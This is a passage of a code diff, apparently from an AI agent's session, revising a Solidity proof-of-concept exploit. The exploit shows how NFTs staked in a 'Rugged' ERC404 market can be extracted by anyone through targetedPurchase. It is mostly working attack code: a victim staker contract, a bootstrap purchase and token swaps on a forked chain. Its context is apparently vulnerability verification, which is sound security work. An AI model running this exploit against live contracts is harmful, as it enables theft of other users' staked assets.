+-            // If the verifier already controls a live on-chain Rugged NFT, transfer it to a
+-            // separate victim helper and have that helper call `stakeNFTs([tokenId])`. This
+-            // preserves the finding's causality without any privileged impersonation.
+-            IERC404Like(rugged).transferFrom(address(this), address(victim), verifierOwnedTokenId);
+-            victim.stakeSingle(verifierOwnedTokenId);
++        // If the verifier does not already hold a Rugged NFT, source one through a real public
++        // market buy. This is only a bootstrap step to obtain a live NFT for the victim stake;
++        // the root cause remains that staking moves the NFT into shared inventory that anyone
++        // can later name and extract through `targetedPurchase`.
++        if (tokenId == 0) {
++            tokenId = _bootstrapVictimNFT(rugged);
++        }
+ 
+-            if (_ownerOf(rugged, verifierOwnedTokenId) == MARKET) {
+-                return verifierOwnedTokenId;
+-            }
++        if (tokenId == 0) {
++            return 0;
+         }
+ 
+-        // On the common fork path the victim stake already happened before the PoC transaction.
+-        // Observing `ownerOf(tokenId) == MARKET` is direct evidence that path stage 1 occurred:
+-        // some public user previously transferred that NFT into the shared pool via staking.
+-        return _findOwnedToken(rugged, MARKET);
++        VictimStaker victimContract = new VictimStaker(MARKET, rugged, address(this));
++        victim = address(victimContract);
++
++        // Exploit path 0:
++        // a separate victim account stakes a chosen NFT via `stakeNFTs([tokenId])`, which
++        // transfers that exact token into the market contract without reserving it.
++        IERC404Like(rugged).transferFrom(address(this), victim, tokenId);
++        victimContract.stakeSingle(tokenId);
++
++        if (_ownerOf(rugged, tokenId) != MARKET) {
++            return 0;
++        }
++
++        return tokenId;
+     }
+ 
++    function _bootstrapVictimNFT(address rugged) internal returns (uint256) {
++        uint256 tokenId = _findOwnedToken(rugged, MARKET);
++        if (tokenId == 0) {
++            return 0;
++        }
++
++        uint256 ruggedBalance = _ruggedBalance(rugged);
++        if (ruggedBalance < PRICE_PER_NFT) {
++            return 0;
++        }
++
++        if (!_approveFungible(rugged, MARKET, ruggedBalance)) {
++            return 0;
++        }
++
++        uint256[] memory tokenIds = new uint256[](1);
++        tokenIds[0] = tokenId;
++        IMarketLike(MARKET).targetedPurchase(tokenIds);
++
++        if (_ownerOf(rugged, tokenId) != address(this)) {
++            return 0;
++        }
++
++        return tokenId;
++    }
++
++    function _victimClaim(address account) internal view returns (uint256 amountStaked) {
++        if (account == address(0)) {
++            return 0;
++        }
++
++        (bool ok, bytes memory data) = MARKET.staticcall(
++            abi.encodeWithSelector(IMarketLike.stakers.selector, account)
++        );
++        if (!ok || data.length < 64) {
++            return 0;
++        }
++
++        (amountStaked, ) = abi.decode(data, (uint256, uint256));
++    }
++
+     function _findOwnedToken(address rugged, address owner) internal view returns (uint256) {
+         for (uint256 tokenId = 1; tokenId <= MAX_TOKEN_ID; tokenId++) {
+             if (_ownerOf(rugged, tokenId) == owner) {
+@@ -193,14 +266,18 @@
+         return IERC20Like(rugged).balanceOf(address(this));
+     }
+ 
+-    function _approve(address token, address spender, uint256 amount) internal returns (bool) {
++    function _approveFungible(
++        address token,
++        address spender,
++        uint256 amount
++    ) internal returns (bool) {
+         (bool ok, bytes memory data) =
+-            token.call(abi.encodeWithSelector(IERC404Like.approve.selector, spender, amount));
++            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+         return ok && (data.length == 0 || abi.decode(data, (bool)));
+     }
+ 
+     function _maybeAcquireRuggedFromHeldETH(address rugged) internal {
+-        if (_ruggedBalance(rugged) >= PRICE_PER_NFT || address(this).balance == 0) {
++        if (address(this).balance == 0) {
+             return;
+         }
+ 
+@@ -212,8 +289,8 @@
+             .swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
+             0, path, address(this), block.timestamp
+         ) {} catch {
+-            // If no live V2 route exists at the fork, continue with the verifier's current
+-            // balance and report insufficient funds rather than fabricating capital.
++            // If no live V2 pool exists at the fork block, continue with verifier-held Rugged
++            // only. The PoC must not fabricate capital or mutate state off-path.
+         }
+     }
+ }
+
+tokens used
+47,366
